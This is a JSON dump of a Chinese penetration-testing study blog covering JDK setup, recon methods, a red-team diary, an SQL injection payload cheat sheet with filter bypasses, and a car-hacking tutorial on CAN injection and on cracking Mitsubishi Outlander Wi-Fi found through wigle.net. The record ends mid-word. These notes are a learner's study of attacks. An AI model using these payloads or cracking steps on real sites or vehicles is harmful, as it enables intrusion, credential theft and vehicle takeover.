[{"id":"31f05bcb8807c536b785c3c2b7399b78","title":"java版本切换","content":"\n\nJDK版本切换我们在进行渗透测试时会用到许许多多的工具，一般的工具需要Java8而有的工具如最新版burp则需要Java11版本。这时候就需要进行JDK的版本切换。\nWindows下的JDK版本切换以JDK8和JDK11为例。我们在官网分别下载好安装包。先安装Java8，默认安装路径在C盘。一直确定就行了。安装完成后配置环境变量，网上一堆教程，这边还是讲一下吧。\n以win10为例，右击此电脑，选择属性，选择右边的高级系统设置。\n选择环境变量，之后可以选择在asus或是系统变量两者反正网上两个都加了。分别点击新建。进行如下操作：\n\n\n之后我们，进入系统变量的path中。点击新建，如果java默认安装在C盘则是这个路径：\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n然后一直确定，就ok了。\n之后我们打开cmd，输入：\njava -verion \n\n\njavac -version\n\n\n当看都如图所示结果，则代表我们的Java8已经完美安装成功了。\n之后直接安装Java11。双击安装包，将安装路径的默认C盘改为D盘。其它就一直确定就行了。\n一定一个C盘一个D盘，比较都在C盘会发生路径重复之类的事情，反正非常麻烦。\n切换版本进入主题，当安装完成后如何切换版本。目前在网上看到的自动化切换脚本都不是太行。\n那就只能手动切换了。完美将Java8的安装路径和Java11的安装路径分别记录到一个txt文本中。\n按照配置环境变量的过程。打开环境变量后，将前面设置好的JAVA_HOME分别进行修改，将路径改为Java11的路径。用户变量和系统变量同时修改。之后修改系统变量中的path，找到Java那一行，将前面设置的C盘路径修改为D盘路径。\nC:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n修改为\nD:\\Program Files (x86)\\Common Files\\Oracle\\Java\\javapath\n\n之后我们一直确定就行。\n完成后，打开cmd。输入：\nJava -version\n\n\njavac -verison\n\n\n将看到如图所示结果，表明我们的JDK版本已经修改完成了。\n记住一定要两个命令结果都显示同一版本才行，不然又会发生一些难以理解的问题。还有每次切换完要重新打开cmd才行。不然你看到的还是原来的版本。\nLinux下JDK版本切换这个网上教程一堆，以后有机会在记录。\n\n","slug":"java版本切换","date":"2021-11-26T06:48:05.000Z","categories_index":"Java版本切换","tags_index":"Java","author_index":"Longw"},{"id":"1b77ba18c55109a4d53f945700a7bb03","title":"信息收集流程","content":"\n\n信息收集的重要性简单说，你能不能挖到东西。能不能多挖东西，就看你信息收集的程度。\nwhois信息收集拿到对方网站域名，在站长之家或是在kali中进行whois查询。\nkali中直接\nwhois &lt;域名&gt;    \n如果返回的是英文，那可以直接百度翻译或是谷歌翻译。\n\n嫌麻烦可以直接站长之家进行查询：http://whois.chinaz.com/\n还有这些：https://whois.aliyun.com/ 、 https://www.whois365.com/cn/、 https://whois.aizhan.com/ \n子域名信息收集有时候主域名很难搞，就可以从子域名下手。\n1、子域名挖掘工具 如：Maltego CE、wydomain、subDomainsBrute、dnsmaper、Layer子域名挖掘机。\n2、搜索引擎挖掘 如： 在Google中输入 site:sina.com\n3、第三方网站查询：http://tool.chinaz.com/subdomain、https://dnsdumpster.com/\n4、证书透明度公开日志枚举：https://crt.sh/ 、http://censys.io/\n5、其他途径：https://phpinfo.me/domain 、http://dns.aizhan.com\n敏感信息收集其实敏感信息在护网时可以当作漏洞提交了。\n例如：数据库文件、SQL注入、服务器配置信息、甚至是通过Git找到站点泄露源代码、以及Redis等未授权访问、robots.txt等敏感信息。从而达到渗透测试的目的。\n\n\n\n关键字\n含义\n\n\n\nsite\n指定搜索域名 例如：site:baidu.com\n\n\ninurl\n指定URL中是否存在某些关键字 例如：inurl:.php?id=\n\n\nintext\n指定网页中是否存在某些关键字 例如：intext:网站管理\n\n\nfiletype\n指定搜索文件类型 例如：filetype:txt\n\n\nintitle\n指定网页标题是否存在某些关键字 例如：intitle:后台管理\n\n\nlink\n指定网页链接 例如：link:baidu.com 指定与百度做了外链的站点\n\n\ninfo\n指定搜索网页信息 info:baidu.com\n\n\n还有这个高级用法查询：https://www.exploit-db.com/google-hacking-database\n还有从数据包中发现目标用到编程语言和服务器信息。\n在GitHub上进行收集信息这个其实得看前面收集信息的程度。\nGithub之邮件配置信息泄露：site:Github.com smtp、site:Github.com smtp @qq.com\nGithub之数据库信息泄露：site:Github.com sa password、site:Github.com root password、site:Github.com User ID=’sa’;Password\nGithub之svn信息泄露：site:Github.com svn、site:Github.com svn username\nGithub之综合信息泄露：site:Github.com password、site:Github.com ftp ftppassword、site:Github.com 密码、site:Github.com 内部\n收集真实IP地址先看是否有CDN，使用：http://ping.chinaz.com/\n没有使用CDN可以直接PING\n如果目标使用CDN，需要绕过CDN来获取真实IP地址。1、内部邮箱源  收集到内部邮箱服务器IP地址2、网站phpinfo文件 phpinfo.php3、分站IP地址，查询子域名  CDN很贵，很有可能分站就不再使用CDN。4、国外访问  https://asm.ca.com/en/ping.php5、查询域名解析记录  https://viewdns.info/\n当收集到真实IP就可以直接访问，如果和网址访问一样就代表真实IP，否则则为假。\n端口信息收集使用nmap进行端口扫描\nnmap -A -v -T4 IP   #快速全面探测\nnmap IP --script banner -p 22   #探测22好端口banner信息\nnmap -p 端口号 -sV IP  \nnmap -O IP   #获取操作系统的信息\nnmap -A -V IP   #对目标进行完整的测试\n\n使用masscan\nmasscan --ports 1-10000 目标IP --adapter-ip 本机IP\n\n--adapter-ip 指定发包的ip地址\n\n--adapter-port 指定发包源端口\n\n--adapter-mac 指定发包的源MAC地址\n\n--router-mac 指定网关MAC地址\n\n--exclude IP地址范围黑名单，防止masscan扫描\n\n--excludefile 指定IP地址范围黑名单文件\n\n--includefile,-iL 读取一个范围列表进行扫描\n\n--wait 指定发包后的等待时间\n\n使用Dmitry\ndmitry -p IP\ndmitry -pb IP #获取banner信息\n\n使用netcat\nnc -nvz IP 端口范围\nnc -nvz 192.168.249.110 20-30\nnc -Vn IP 端口号 #获取端口banner信息\n\n\n\n\n端口\n端口说明\n攻击方法\n\n\n\n22\nSSH远程连接\n爆破、SSH隧道及内网代理转发、文件传输\n\n\n23\nTelnet远程连接\n爆破、嗅探、弱口令\n\n\n3389\nrdp远程桌面\nShift后门、爆破\n\n\n5900\nVNC远程连接\n弱口令、RCE\n\n\n5632\nPcAnywhere远程连接\n嗅探、代码执行\n\n\n收集web站点信息CMS在线识别：http://whatweb.bugscaner.com/look/  、 http://www.yunsee.cn/finger.html\nCMS本地识别：whatweb、御剑web指纹识别程序、大禹CMS识别程序 https://github.com/Ms0x0/Dayu\nCMS漏洞查询利用：https://bugs.shuimugan.com\n后台扫描探测工具：\n老版本：                                                              新版本：\n1、御剑后台扫描工具                                         dirmap2、wwwscan命令行工具                                    dirsearch3、dirb命令行工具                                              .git源码泄露4、dirbuster扫描工具\n国外的网站使用wordpress,可以使用wpscan工具进行安全测试。\n使用扫描网站对IP进行探测使用shodan：https://account.shodan.io\n使用钟馗之眼：https://www.zoomeye.org/\n使用FOFA：https://fofa.so/\n使用shodan查看是否有蜜罐：\nshodan honeyscore IP地址\n\n使用集成工具进行信息收集HGather：https://github.com/BaizeSec/HGather\nrailgun：https://github.com/lz520520/railgun  这是使用说明书\n以上内容大部分来自网络。。。。。。\n","slug":"信息收集流程","date":"2021-11-20T11:43:56.000Z","categories_index":"流程","tags_index":"信息收集","author_index":"Longw"},{"id":"c5a6228e829628ebe329c5df737b79b7","title":"第一次护网","content":"\n\n老实讲，这个我都不好意思放出来。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。。。。\n。\n。。。。。、\n、。。。。、。。\n。。。。。。\n。。。。。\n。。。。\n。。。。。\n。。。\n。。。。。\n.。。。。。\n。。。。。\n。。。。。\n。。。。。\n。。。。\n。。。\n。\n。。。。。\n但是要知耻后勇。。。\n小计没想到第一次护网居然是老家。。。。。。。。\n临近年关，等保测评一大批，居然还有护网，虽然只有红队。刚刚实习就上战场了。让我颇感无奈。。。\n不过实战也是学习最多的，基础薄弱啊。。学的杂并且很浅。。。\n一开始发了一些测试网站，尝试入侵。结果不知道如何下手，准备先用扫描工具扫描一波。。更无奈的是awvs又出问题了！！！！无奈只好卸载。卸载好准备重装，结果弹窗重启，电脑卡死了。。。只好强制关机。重启后使用appscan扫描了一个站点，无发现。再次使用弹窗电脑阻止运行。😅😅😅！！！！！！！！！！！！\n没办法了，只有手测。一个一个试试。后台很多，不幸的是我跑的后台基本都不能爆破。好不容易找到弱口令再想上交已经不加分了。😅\n一心想着sql注入，尝试了一批站点全是防火墙过不去。。。。。注册论坛，xss发布任务也没有弹窗。。\n乱打一通，全部白干。。。。。。。。。。。。。。。。。\n好笑的是旁边盛世航明主办方的队伍还在那里嘲讽。。。虽然我没有丧失信心，但是还是挺羞愧的。\n也是挺佩服他们的，短短几个小时就攻下了好几个站点。。。\n经验忽略了最要紧的信息收集，吃了很大很大的亏。。。。下决心，先把这方面弄到流程化。\n其他先按部就班的学吧。还要会对cve漏洞进行利用。\n不够细心，容易忽略细节，关键就是细节。\n看了一下另一支队伍挖到的sql注入，不仅是他信息收集做的好，还有他很细心。一直手动测试，结果发现忽略了工具的使用。\n思路很重要，但是你得到一定水平才知道该怎么办。\n一定要定一个流程，没什么发现就按照流程走一遍。有了发现才能进行深入。\n反正也是加油吧！！！努力学习！！！希望有一天也能打个护网前几试试。\n","slug":"第一次护网","date":"2021-11-19T15:36:33.000Z","categories_index":"总结","tags_index":"总结","author_index":"Longw"},{"id":"754cd72126d47294dafd145f6f3562e7","title":"SQL注入总结","content":"\n\n最近本来是打算投简历看看的，结果当场面试了，很尴尬。笔试发现自己菜的扣脚。。。毕竟接触时间较短，发现好多我不懂的问题，连http协议都有地方不会。。。。。。。。https的s是用来防止中间人攻击的，反射型xss不是在服务器上。\n一个漏洞一个漏洞的总结吧。。。。\n常见注入点\n表单中的输入域\n URL的参数\n Cookie或者隐藏域\n\n注入点检测?id&#x3D;1     #测试点\n?id&#x3D;1&#39;   #单引号报错\n?id&#x3D;1&quot;   #双引号报错\n?id&#x3D;1\\   #反斜杠报错\n?id&#x3D;1&#39;--+    #注释后面\n?id&#x3D;1&#39;)--+\n?id&#x3D;1&#39;))--+  #有的需要加)或者两个))\n?id&#x3D;1 and 1&#x3D;1 #数字型不变逻辑,后面可加注释如:--+,#等\n?id&#x3D;1 and 1&#x3D;2 #空集逻辑\n?id&#x3D;1 or 1&#x3D;1  #全集逻辑\n?id&#x3D;1&#39;and &#39;1&#39;&#x3D;&#39;1 #字符型不变逻辑，其他如上\n?id&#x3D;1+and+1&#x3D;1--+  #用加号代替空格\n上面还可以进行url编码，有些浏览器自动将空格编码，有些则没有，可以自己利用url编码工具进行编码。\n前面的如果有明显变化的，表示可能存在注入点。若没有明显变化,则可以使用sleep函数测试。\n?id&#x3D;1&#39; and sleep(5)  #用sleep函数进行注入点测试\n当然我们可以直接利用sqlmap进行注入点检测，在kali中\nsqlmap -u http:&#x2F;&#x2F;xxx.xx?id&#x3D;1   #将会自动检测\n\n注入利用–MySQL判断数据库user(),version()\n不同的数据库返回值都各有特征，进而推断是什么数据库类型。\n如user()函数返回情况：\n     mysql返回root@localhost\n     oracle返回sys\n     sqlserver返回sa\n执行成功，即探子回报。说明程序对函数，括号()和子查询并未做过滤，可能可以执行函数、子查询等复杂逻辑。\n探子没有回报，基本上说明注入攻击困难或者注入可能性很小。\n\nGET类型-有回显点order by 3  #判断字段数\n?id&#x3D;1&#39;and 0&#x3D;9 union select 1,2,3  #判断回显点\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(schema_name),3 from information_schema.schemata --+ \n#获取所有库名\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(distinct table_schema),3 from    information_schema.tables --+\n#获取所有库名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() --+   #获取表名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; --+   #获取字段名\n\n?id&#x3D;1&#39; and 0&#x3D;9 union select 1,group_concat(username,0x3a,password),3 from users--+  #获取字段值\n\n\n相关函数和数据库结构信息User() current_user() session_user() 返回当前连接的用户名（包含主机名）\nversion() 数据库版本号\ndatabase() 当前连接的数据库名\nlength()   计算字符串长度\nleft()    取最左边的字符\nsubstring() 取字符串中任意长度字长\nposition()  返回字符所在字符串中的位置\nlocate()    返回字符所在字符串中的位置\n在Mysql 5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)。ROUTINES 存储过程或者函数信息,VIEWS 视图信息,TRIGGERS 触发器信息\n\n在schemata表中，schema_name字段用来存储数据库名。\n在tables表中，table_schema和table_name分别用来存储数据库名和表名。\n在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)\n拓展limit关键字  limit m,n 从m行开始，到m+n行\n\n盲注?id&#x3D;1&#39;and if(left(version(),1)&#x3D;5,sleep(1),2)  #利用sleep函数判断版本号或者用户名，密码等\n?id&#x3D;1&#39; and if(substring(uname,1,1)&#x3D;&#39;b&#39;,benchmark(10000000,md5(&#39;b&#39;)),1)  #Benchmark穷举法猜测用户名和密码等\nSelect sleep(1);睡眠1秒\nSelect left(user(),1)获得user()最左边的1位\nSubstring()获得字符串任意位置的任意个字符\nBenchmark()对运算执行压力测试\nIf()表达式，第一个表达式为真，则执行第二个表达式，否则执行第三个表达式\n一般利用工具盲注，太麻烦太耗时间了。\n\n报错注入没有错误也要制造错误，并把查询的信息让错误带出来告诉注入者到底有什么东西，把所有家底能透露的都透露了。\n相关函数：If(),rand(),floor(),ifnull(),concat,group_concat()\nSelect count(*),concat(version(),floor(rand()*2),user()) as a from users group by a  #暴露系统用户名敏感信息\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\nselect count(*),concat((select (select (SELECT schema_name FROM information_schema.schemata limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2)) x_col from information_schema.tables group by x_col   #获取所有库名\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(table_name,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+  #获取表名\n\nselect count(*),concat((select (select (SELECT table_name FROM information_schema.tables where table_schema&#x3D;database() limit 0,1)) as a_col from information_schema.tables limit 0,1),floor(rand(0)*2))x_col from information_schema.tables group by x_col   #获取所有表名\n\n\nid&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取用户信息\n\n?id&#x3D; 0&quot; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+   #双引号报错注入，前面是单引号。\n\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1);   \n#利用updatexml函数进行注入,database()是系统函数返回系统变量database的值。@@version代表系统变version\n?id&#x3D;1 and updatexml(2,concat(0x7e,@@version,0x7e),1);\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e));   #利用extractvalue函数进行注入\n?id&#x3D;1 and extractvalue(1,concat(0x7e,@@version,0x7e));\n\n宽字节注入当数据库使用gbk编码时，使用%DF%5C，%bf%5c进行宽字节注入，将单引号闭合。\nasscii大于128， GBK首字节对应0x81–0xFE,尾字节对应0x40–0xFE(除去0x7F)。\nSQLMAP使用–tamper=unmagicquotes.py脚本。\n二次注入注入payload，再利用如重置密码功能修改管理员密码。\nadmin&#39;-- -\n\n注入payload，触发xss攻击。\nAccess注入(ASP+Access)只有表，直接用sqlmap查表,基本基于字典\nsqlmap -u url --tables\n\nAccess偏移注入知道表名，得不到字段。\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)\n\n\n\n规避检查or–+2=!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格注释替代 and//select//uname//from//users+号连接字符替换\n大小写绕过\nand\n改为\nAnD \n\n双写绕过\nunion\n改为\nuniunionon\n\nand改为&amp;&amp;，or改为||.\n/*!内联*/  内联注释，会执行看里面的内容\n&#x2F;*!union*&#x2F; select 1,2,3 --+\n\n/**/多行注释\nun&#x2F;**&#x2F;ion select 1,2,3 --+\n\n将语句进行url编码\n十六进制码替代%20ASCII码替换char(32)\nand substring(user(),1,1)&#x3D;‘z’\n改为\nand asci(substring(user(),1,1))&#x3D;122   #规避了单引号\n\n空格替换\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\n还有好多内容啊，等后面一一总结吧！！！\n现在的网站基本上都防御了sql注入。想在网站上找到注入点真难。。还是玩靶场好一点。\n","slug":"SQL注入总结","date":"2021-11-08T11:24:23.000Z","categories_index":"安全漏洞基础","tags_index":"owasp TOP 10","author_index":"Longw"},{"id":"ebc4d430e2c23dfe4e07a222f7299552","title":"汽车黑客入门","content":"\n\n最近在telegram上找到一个安全实验室的成员，关注了一下。发现她的研究方向是汽车黑客，看了一下他发的汽车黑客入门，挺有意思的。。。。。。\n分为基础篇，模拟器篇，案例篇。\n原作者：https://www.hackers-arise.com/automobile-hacking\n基础篇仔细看了一下，前面讲的都是硬件、协议啊、数据包类型啊之类的。大概能看懂，就不写了，无聊嘛。后面写到是买一个蓝牙ODB II迷你接口用来连接连接到汽车的OBD II接口。完蛋，第一篇没车不弄了。\n后面就是使用kali中msf自带的攻击模块，进行攻击。\nICS模拟器篇因为没车，所以就玩模拟器。\n\n安装模拟器\n\n我们打开kali终端安装必要的依赖\nsudo apt install libsdl2-dev libsdl2-image-dev -y\n\n等待安装完成，接下来就是安装模拟器\ngit clone https:&#x2F;&#x2F;github.com&#x2F;zombieCraig&#x2F;ICSim\n\n等待安装完成。\nsudo modprobe vcan &#x2F;&#x2F;加载模块\nsudo ip link add dev vcan0 type vcan &#x2F;&#x2F;为设备名称为vcan0类 型为vcan的设备增加虚拟接口\nsudo ip link set up vcan0 &#x2F;&#x2F;激活vcan0\nifconfig vcan0 &#x2F;&#x2F;验证配置\n\ncd ICSim    #进入下载好的目录\nsudo bash setup_vcan.sh     #运行文件\n\n前面正常的话就可以进行编译了。\nmake\n\n\n玩模拟器\n\n接下来打开模拟器\n.&#x2F;contorls vcan0     #这是控制界面\n然后再打开一个终端进入安装目录\n.&#x2F;icsim vcan0    #这是汽车模拟器\n\n然后你的界面就会出现两个小窗口，这就是你的模拟器和控制器。没有截图，纯手工描写。\n接下来就是叫你如何使用模拟器\n有手柄按照操控界面提示来\n没有手柄就用键盘\n数字旁边有个上下左右那个\n按-&gt; 加上enter 就会亮起信号灯，另一个就不用讲了\n按住-&gt; + shift + a&#x2F;b&#x2F;xy 就会分别打开汽车的车门。至于关门，看不懂，研究好久没弄出来。\n按住 ^ + enter  就会加速 \n\n要学的暂时就这么多了。\n因为上一篇没写，所以没安装工具。现在来安装工具。\ngit clone https:&#x2F;&#x2F;github.com&#x2F;linux-can&#x2F;can-utils.git\n\n下面是工具的一些基础知识\ncan-utils工具可以被分为几个功能组\n1. 显示、记录、生成和重放CAN通信的基本工具\n2. 通过IP socket 访问CAN\n3. CAN内核网关的配置 \n4. CAN总线测量\n5. ISO-TP工具 \n6. 日志文件转换器 \n7. 串行线规范（slc）配置 \n因为刚刚起步，我们将只关注基本工具和日志文件转换器。\ncan-utils中的工具及其功能的完整列表如下： \n\n1. 显示，记录，生成和重放CAN流量的基本工具\ncandump：显示，过滤和记录CAN数据，导出到文件\ncanplayer：重播CAN日志文件\ncansend：发送单个帧\ncangen：生成（随机）CAN流量\ncansniffer：比对CAN数据内容的差异（仅11位CAN ID） \n\n2. 通过IP socket进行CAN访问\ncanlogserver：记录来自远程或本地主机的CAN帧\nbcmserver：交互式BCM配置（远程&#x2F;本地）\nsocketcand：通过TCP &#x2F; IP socket 使用RAW &#x2F; BCM &#x2F; ISO-TP socket\n\n3. CAN内核网关配置\ncangw：用于netlink配置的CAN网关userpace工具\n\n4. CAN总线的测量和测试\ncanbusload：计算并显示CAN总线负载\ncan-calc-bit-timing：内核空间比特率计算的用户空间版本\ncanfdtest：全双工测试程序（DUT和主机部分） \n\n5. 适用于Linux的ISO-TP工具ISO15765-2：2016\nisotpsend：发送单个ISO-TP PDU\nisotprecv：接收ISO-TP PDU\nisotpsniffer：“窃听” ISO-TP PDU\nisotpdump：“窃听”并解释CAN消息（CAN_RAW）\nisotpserver：用于简单的TCP &#x2F; IP 与 ISO 15765-2 桥接（ASCII HEX）的IP服务器\nisotpperf：ISO15765-2协议的性能可视化\nisotptun：通过ISO-TP在CAN上创建双向IP隧道\n\n6. 日志文件转换器\nasc2log：将ASC日志文件转换为紧凑型CAN框架日志文件\nlog2asc：将紧凑型CAN框架日志文件转换为ASC日志文件\nlog2long：将紧凑的CAN帧表示形式转换为用户可读 \n\n7. 串行线路规范配置（用于slcan驱动程序）\nslcan_attach：用于串行线CAN接口配置的用户空间工具\nslcand：用于串行线CAN接口配置的守护程序\nslcanpty：使用slcan ASCII协议为应用程序创建一个pty\n\n安装完成之后，我们先进入工具目录\nCCansniffer过滤特定流量\ncansniffer -c vcan0    #用来嗅探CAN的流量\n当我们使用-c选项时，正在变化的值会变成红色，以帮助我们识别这些关键值。\n使用-h参数查看帮助\n\n回车后，会发现一直跳跳跳，正常现象。\n接下来输入\n-000000\n\n输入完，回车。就会发现跳的流量没有了。\n+40C    #就会显示ID&#x3D;40C的流量\n\nCandump捕获CAN流量\ncandump -c -l vcan0   #-l 参数来记录，-c参数对输出进行着色。\n\ncandump -c -l -s 0 -a vcan0   #记录的同时，进行输出\n\ncanplayer进行重放\ncanplayer -I candump-xxx.log   #因为文件名不一样，直接tab键补全\n\ncansend 发送自定义帧\ncansend vcan0 40C#033133383439000d      #发送40C这一帧数据\nvcan0是接口\n40C＃是框架ID\n000005500108000D是我们要发送的数据\n\n\n逆向\n\n在了解了工具的使用之后，我们开始逆向工程。在控制板输入加油门指令进行加速，并且抓取数据流。\n当速度达到100就可以松开。\ncansniffer -c vcan0\n-000000\n+244                 #ID为244的数据包可能是汽车加速的数据包\n\ncansend vcan0 244#0000003812   #向汽车发送数据包，看能否是汽车速度达到100\n\n因为信号单一，看不到任何效果，那么就可以使用\nwhile true; do cansend vcan0 244#0000003812; done\n\n执行，就可以看到汽车油门指针不断的向100跳跃。\n案例篇(原作者：https://www.hackers-arise.com/automobile-hacking)就是讲了一次入侵汽车系统的操作过程。\n这是视频地址：https://youtu.be/xHCUpLBGIKQ\n下面是分析：\nStep1：从车辆捕获低频信号\n这个种攻击通过一个射频（RF）链路转发来自车辆的低频（LF）信号。每个射频链路由一个发射器和一个接收器组成。\nStep2：将LF转换为2.5GHZ并发送到接收器\n发射器捕获车辆的低频（LF）信号并转换为2.5GHz。然后，该信号通过空中（最长100m）发送到接收器，该接收器再将其转换回LF信号。\nStep3：放大信号并发送到LF天线\n接收器处的LF信号被放大并发送到环路LF天线，该天线复制车辆最初发送的信号。然后使用环形LF天线传输信号以打开门，然后启动发动机。\n入侵汽车报警系统以控制车辆由于许多汽车使用的钥匙存在众所周知的漏洞，人们一直在通过购买汽车报警系统来弥补这一缺陷。\n许多这样的钥匙都可以被上面所讲述的中继攻击来入侵。因此，汽车报警器供应商一直在销售高端（有些高达5000美元）的汽车报警系统，以弥补这一风险，并标榜自己是 “不可破解的”（这就像在黑客面前挥舞红色斗篷一样）。\n事实证明，许多这样的报警系统实际上比车辆上的钥匙或其他数字系统更容易被黑。 \n最近，Pentest Partners证明他们只需篡改电子邮件用户重置选项的一些参数（一种微不足道的网络黑客技术）就足以控制这些系统。 \n下面是提供这些报警系统app之一的截图。正如你所看到的，这个应用程序使用户可以远程锁定、获得车辆地理定位和启动停止车辆。如果攻击者能够修改这个应用程序的用户，那么他们即使不是合法车主也可以做所有这些操作。\n\n参数篡改当Pentest Partners的成员在Viper报警系统上选择 “修改用户 “选项时，他们发现这个请求没有被正确验证，如下图所示。 \n因此，他们可以简单地发送一个POST请求来修改用户和密码并控制车辆。这可以通过BurpSuite、Paros Proxy或Tamper Data等代理工具完成。然后，合法用户被锁在自己的车外，黑客则可以控制车辆。 \n\n正如你在下面看到的，用户的电子邮件和密码被通过写好都漏洞利用脚本改成了攻击者想要的，现在攻击者可以随意解锁和启动、停止车辆。\n\nPandora案例在潘多拉公司（Pandora）的一个类似系统中，在 “修改用户 “选项中也发现了这种缺乏验证的情况。\n在这里，黑客可以简单地用他们自己的电子邮件地址修改 “电子邮件 “字段，并使用一个 “id “号码来发送一个更改用户和密码的请求。 \n\n正如你在下面看到的，黑客同样能够利用脚本改变用户的电子邮件地址和密码并控制车辆。\n\n随着运输系统日益数字化，汽车或车辆入侵攻击是网络安全的最前沿。 \n这些车辆的制造商正在犯15年前在传统IT系统中常见的，同样的错误。这些报警系统制造商犯了一个非常基本的错误，没有验证用户修改功能，使攻击者能够通过简单的参数篡改来控制 “受保护”的车辆。\n入侵三菱欧蓝德PHEV近年来，汽车已经变得越来越复杂。大多数汽车现在都有许多集成电路（IC）和大量的软件，既可以优化车辆的运行（例如燃料和氧气消耗、防抱死制动、自动感应和制动系统等），也可以为车主提供便利。随着这种复杂性和先进性的增加，脆弱性也随之增加了。 \n最近，来自英国Pentest Partners的白帽黑客注意到，三菱Outlander PHEV有一个应用程序，司机可以通过车内的Wi-Fi接入点（AP）进行连接。通常情况下，这种应用程序应该是要通过GSM或云技术连接来访问这车辆的控制系统的。而在欧蓝德上，则可以通过这个Wi-Fi接入点来访问一些车辆控制系统，包括报警系统、充电系统、灯光、风扇和温度控制等。 \n这意味着，如果我们或小偷能够连接到这个内置在车辆中的无线AP，那么盗窃报警系统就可以被禁用，以及做一些其他事情。使这辆车更加脆弱的是Wi-Fi的安全设计，或者说，安全实施不严格。 \n它存在以下几个明显的安全问题： \n\nWiFi接入点的密码记录在了车主手册中。 \n\n接入点的SSID都符合 “REMOTEnnaaaa “的规律，其中 “n “是任何数字，”a “是任何小写字母。 \n\n密码相对较短且简单，使其容易被暴力破解。\n\n\n寻找脆弱的三菱欧蓝德目标这款三菱欧蓝德的销量超过10万辆，所以你身边很可能就有一辆。当然，你可以简单地走在街上寻找它们，或者你可以按照这辆车所特有的SSID模式进行自动搜索。 我们可以使用无线地理记录引擎www.wigle.net（wigle.net对WiFi AP进行编目，并通过GPS坐标对其进行索引）。 \n在那里，我们可以使用Outlander的SSID的字符串模式，并选择按SSID搜索。当我这样做时发现了许多目标在wigle.net上搜索时，搜索字符串 “REMOTE______”，其中6个下划线代表：2个数字和4个字 母，如下所示。 \n\n正如你在下面看到的，我找到了许多符合这种模式的AP，大多数在西欧。我们可以通过在wigle.net中加入我们的GPS坐标来细化我们的搜索，以找到你所在地区的车辆。\n\n入侵欧蓝德的AP一旦我们找到了三菱欧蓝德，下一步就与任何使用aircrack-ng和hashcat的无线AP破解非常相似。首先，我们连接到AP，然后在4路握手包中提取获得密码哈希值，最后，开始暴力破解。让我们开始吧!\n首先，我们将使用Kali Linux 和aircrack-ng。我将使用一个旧的Alfa AWUS036H USB无线适配器，当然你可以使用任何你喜欢的兼容kali的无线网卡 \n第一步是检查无线连接。\niwconfig\n\n\n确定我的无线适配器是wlan0。 \n然后，我们需要将无线适配器调至监听模式\nairmon-ng start wlan0\n\n\n这里要注意的是，这个过程会无线适配器的名称改为mon0。 \n接下来，我们需要开始捕捉周围的无线流量。\nairodump-ng mon0\n\n\n\n\n正如你在上面的截图中所看到的，我们可以看到三菱的AP名为REMOTEaa1234。这就是我们的目标AP。 \n接下来我们需要在该信道上捕获该AP，并将捕获的PSK写入一个名为carhack的文件中。\nairodump-ng --bssid &lt;the AP BSSID&gt; -c &lt;the AP channel&gt; --write carhack mon0\n\n\n\n\n当车主连接到车上的AP时，我们在4路握手中捕获密码哈希值。 \n如果车主是已经连接的状态，可能就需要使用 aireplay-ng 的 deauth 功能来踢掉他们，当他们重新连接时，就可以捕获哈希值。 \n最后一步是破解这个哈希值。Aircrack-ng在破解WPA-PSK的哈希值方面不是特别好，但幸运的是，hashcat在这方面足够强大。 \n我们可以使用以下命令将cap文件carhack.cap转换为可用于hashcat的格式（.hccap）。\naircrack-ng &lt;the aircrack .cap file&gt; -J &lt;the hashcat .hccap file&gt;\n\n\n转换好的文件可以直接使用hashcat进行破解。\nPentest 